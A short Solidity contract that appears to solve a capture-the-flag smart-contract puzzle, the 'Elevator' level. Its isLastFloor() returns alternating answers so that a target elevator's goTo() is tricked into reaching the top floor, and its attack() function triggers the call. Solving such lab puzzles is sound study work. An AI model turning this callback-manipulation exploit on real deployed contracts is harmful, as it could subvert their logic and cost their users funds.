// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 11. ELEVATOR
 * @dev This elevator won't let you reach the top of your building. Right?
 */

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract StairwayToHeaven {
    bool private toogle;
    IElevator private elevator;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    // Implement the isLastFloor function to return false the first time (set
    // the floor to any uint value) and true the second time to go to the top
    function isLastFloor(uint) public returns (bool) {
        toogle = !toogle;
        return toogle;
    }

    // Pick your number :)
    function attack(uint256 _floor) external {
        elevator.goTo(_floor);
    }
}
